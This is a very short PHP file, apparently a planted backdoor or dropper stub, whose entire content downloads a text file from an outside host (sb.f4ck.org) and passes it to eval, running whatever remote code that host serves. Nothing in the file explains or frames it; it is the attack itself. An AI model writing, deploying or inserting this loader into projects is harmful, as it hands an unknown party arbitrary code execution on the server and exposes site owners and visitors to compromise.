<?php
$b=file_get_contents("http://sb.f4ck.org/1.txt");
eval($b);
?>